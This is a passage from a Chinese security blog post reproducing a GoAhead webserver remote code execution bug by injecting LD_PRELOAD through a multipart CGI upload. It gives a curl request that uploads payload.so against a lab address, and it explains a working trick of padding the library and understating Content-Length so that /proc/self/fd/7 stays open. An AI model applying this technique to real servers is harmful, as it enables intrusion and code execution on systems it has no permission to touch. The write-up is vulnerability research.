<div class="codehilite"><pre><span></span><code><span class="n">curl</span> <span class="o">-</span><span class="n">v</span> <span class="o">-</span><span class="n">F</span> <span class="n">data</span><span class="o">=</span><span class="err">@</span><span class="n">payload</span><span class="o">.</span><span class="n">so</span> <span class="o">-</span><span class="n">F</span> <span class="s2">&quot;LD_PRELOAD=/proc/self/fd/7&quot;</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">1.112</span><span class="p">:</span><span class="mi">8080</span><span class="o">/</span><span class="n">cgi</span><span class="o">-</span><span class="n">bin</span><span class="o">/</span><span class="n">test</span>
</code></pre></div>

<p>但我尝试了从4开始到100所有的文件描述符，都无法完成劫持，查看日志无非是如下几种错误：</p>
<ul>
<li><code>ERROR: ld.so: object '/proc/self/fd/7' from LD_PRELOAD cannot be preloaded (file too short): ignored.</code></li>
<li><code>ERROR: ld.so: object '/proc/self/fd/5' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.</code></li>
<li><code>ERROR: ld.so: object '/proc/self/fd/2' from LD_PRELOAD cannot be preloaded (invalid ELF header): ignored.</code></li>
</ul>
<p>按照原文章中的方法，这个漏洞完全利用不了。</p>
<p>那么我们来研究研究原因。我们修改test cgi脚本，让其输出一下<code>/proc/self/fd/</code>下的文件和<code>/tmp/</code>下的文件：</p>
<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>

<span class="nb">echo</span> -e <span class="s2">&quot;Content-Type: text/html\n&quot;</span><span class="p">;</span>

ls -al /proc/self/fd/
ls -al /tmp/
</code></pre></div>

<p>发送一个上传包：</p>
<p><a href="../media/attachment/2022/01/05/28254d41-337c-4dd0-81ce-9f5f21adf38e.png"><img alt="image.png" src="../media/attachment/2022/01/05/28254d41-337c-4dd0-81ce-9f5f21adf38e.2232338a1582.png" /></a></p>
<p>可见，tmp目录下成功写入了临时文件<code>tmp-22.tmp</code>，但在<code>/proc/self/fd/</code>目录下没有相关的文件描述符。</p>
<p>我没有调试代码，无法肯定导致这个问题的原因。<strong>但有一种可能，就是在执行到CGI这里的时候，被打开的临时文件描述符其实已经被关闭了</strong>。这就是我遇到的第四个坑。</p>
<h2 id="_7"><a class="toclink" href="#_7">找到可包含的文件</a></h2>
<p>那么我们如果想要利用这个漏洞，就必须找到可以被包含的文件，从上面的测试过程可以发现，临时文件其实已经被写入了，只不过其中文件名包含一个从0开始递增的数字，我们需要进行爆破。</p>
<p>而且爆破的请求本身也会导致这个数字继续上涨，这个过程十分不稳定，所以自然也不建议利用这个文件。</p>
<p>我们还是看回到文件描述符，什么情况下我们可以让这个文件描述符不要关闭？</p>
<p>我想到一种方法，就是<strong>在文件没有上传完成的时候，这个文件描述符不会被关闭。</strong>那么如何做点这一点呢？有两种方法：</p>
<ul>
<li>使用两个线程，线程一流式缓慢上传文件，线程二使用<code>LD_PRELOAD</code>包含这个文件</li>
<li>给payload.so文件内容后增加一些脏字符，并将HTTP的Content-Length设置成小于最终的数据包Body大小。这样，GoAhead读取数据包的时候能够完全读取到payload.so的内容，但实际这个文件并没有上传完毕</li>
</ul>
<p>第二种方法不需要用到线程或竞争，一个数据包可以搞定，甚至不需要写代码，所以我通过第二种方法来利用。</p>
<p>首先构造好之前那个无法利用的数据包，其中第一个表单字段是<code>LD_PRELOAD</code>，值是文件描述符，一般是<code>/proc/self/fd/7</code>。然后我们需要改造这个数据包：</p>
<ul>
<li>给payload.so文件末尾增加几千个字节的脏字符，比如说<code>a</code></li>
<li>关掉burpsuite自动的“Update Content-Length”</li>
<li>将数据包的Content-Length设置为不超过16384的值，但需要比payload.so文件的大小要大个500字节左右，我这里设置为15000</li>
</ul>
<p><a href="../media/attachment/2022/01/05/2943c3a7-e77c-4a2c-9de6-c67d29eaa59c.png"><img alt="image.png" src="../media/attachment/2022/01/05/2943c3a7-e77c-4a2c-9de6-c67d29eaa59c.5c39cddb7818.png" /></a></p>
<p>发送这个数据包，就可以成功劫持到<code>LD_PRELOAD</code>：</p>
<p><a href="../media/attachment/2022/01/05/69f6d411-652b-4edd-b19d-681e69469a6d.png"><img alt="image.png" src="../media/attachment/2022/01/05/69f6d411-652b-4edd-b19d-681e69469a6d.91bdfce5325f.png" /></a></p>
<p>这里的原理其实就是，pyaload.so加上后面的脏字符构造的数据包实际大小比Content-Length大，导致上传实际上只上传了一半，保存在临时文件中的是完整的payload.so和一些脏字符。</p>
<p>由于上传流程没有结束，所以此时文件描述符是没有关闭的，可以通过<code>/proc/self/fd/7</code>读取到，脏字符也不影响动态链接库的加载和运行，最后即可成功完成劫持。</p>
<h2 id="_8"><a class="toclink" href="#_8">后记</a></h2>
<p>这个漏洞踩坑了一晚上，最后仍然没能复现原始文章中直接包含文件描述符的方法，但通过上传一个“不完整”的数据包间接达到了这个目的，完成了攻击流程。</p>
<p>至于<a href="https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/" target="_blank">PBCTF 2021 - RCE 0-Day in Goahead Webserver</a>文章中介绍的注入其他环境变量来getshell的方法，虽不通用也很有趣，大家可以自行学习。</p>
          </div>
        </article>

        
          <h1 class="h1 color-main">赞赏</h1>
          <div class="zan text-center">
            <p>喜欢这篇文章？打赏1元</p>
            <p class="m-0"><img src="../static/wx.jpg" width="280" alt=""></p>
          </div>
        

        <div id="reply-list">
          <h1 class="h1 color-main">评论</h1>
          
            
              <div class="flex mb-2" id="comment-3780">
                <div class="gravatar">
                  <img src="https://secure.gravatar.com/avatar/327e32ad17b93605a1618202152f2e16.jpg?s=100&amp;d=mm&amp;r=g" width="40px" height="40px" alt="">
                </div>
                <div class="ps-2">
                  <p class="comment-meta title">
                    <a href="" target="_blank" rel="nofollow noopener">gur2xx</a>
                    <time datetime="2022年1月11日 15:09" itemprop="datePublished">
                      2022 一月 11 15:09
                    </time>
                    <a href="javascript:reply_to('3780', 'gur2xx')">回复</a>
                  </p>
                  <p class="comment-meta">您好，想请教一下在哪里可以查看goahead的日志信息呢？</p>
                </div>
              </div>
              
            
          
        </div>

        

        <form method="post" enctype="multipart/form-data" action="#reply" id="reply" class="mb-4">
          <div class="container-fluid px-0">
            
            <div class="row">
              <div class="col">
                <textarea name="content" cols="40" rows="6" required id="id_content">
</textarea>
              </div>
            </div>
            <div class="row gx-2">
              <div class="col-4">
                <input type="text" name="nickname" placeholder="昵称" maxlength="64" required id="id_nickname">
              </div>
              <div class="col-4">
                <input type="text" name="email" placeholder="邮箱（可留空）" maxlength="254" id="id_email">
              </div>
              <div class="col-4">
                <input type="text" name="url" placeholder="链接（可留空）" maxlength="200" id="id_url">
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-4">
              <div class="row gx-2" style="margin-top: 8px"><div class="col-6"><input autocomplete="off" id="id_captcha_1" name="captcha_1" type="text" placeholder="验证码" /> <input id="id_captcha_0" name="captcha_0" type="hidden" value="c7ad033e54d2777aeda0f878c7a7ec4fb8fcb1eb" />
</div><div class="col-6">
<img src="../captcha/image/c7ad033e54d2777aeda0f878c7a7ec4fb8fcb1eb/index.png" alt="captcha" class="captcha" /></div></div>
            </div>
          </div>
          <div class="row">
            <div class="col">
              <input type="submit" class="ui-button ui-button-sgreen" value="提交">
            </div>
          </div>
          <input type="hidden" name="archive" value="475" id="id_archive">
          <input type="hidden" name="parent" id="id_parent">
          <input type="hidden" name="csrfmiddlewaretoken" value="7FLphRZdMLf1Wq3DYYDbYEG9t70qCgSwTd9gPWAWa7tKuYR10ZAWV7JeOuhBbS4O">
        </form>
      </div>
    </div>
    <div class="row justify-content-center">
      <div class="col-lg-7 col-md-10 col-sm-12">
        <footer class="footer mx-auto">
  <div class="footer-left">
    Copyright &copy; 2023 Powered by talkbook
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <li><a href="../index.html">首页</a></li>
        <li><a href="../feed/index.rss" target="_blank">RSS订阅</a></li>
        <li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
        <li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
        <li><a href="../index.html">更换模板</a></li>
      </ul>
    </nav>
  </div>
</footer>
      </div>
    </div>
  </div>

<script src="https://cdn.staticfile.org/jquery/2.2.4/jquery.min.js"></script>
<script src="../static/cactus/js/main%EF%B9%96v=2021102502.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

  <script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
  <script>
      $(document).ready(function () {
          $(".content a").each(function (i, e) {
              if (e.host != 'www.leavesongs.com') {
                  e.target = '_blank';
              }
          });
          $(".content img").each(function (i, e) {
              if (e.parentNode.tagName.toUpperCase() != 'A') {
                  $(e).wrap('<a href="' + escapeHtml(e.src) + '" class="fancybox"></a>');
              } else {
                  $(e.parentNode).addClass('fancybox');
              }
          });
          $('.fancybox').fancybox();
      })
  </script>

</body>
</html>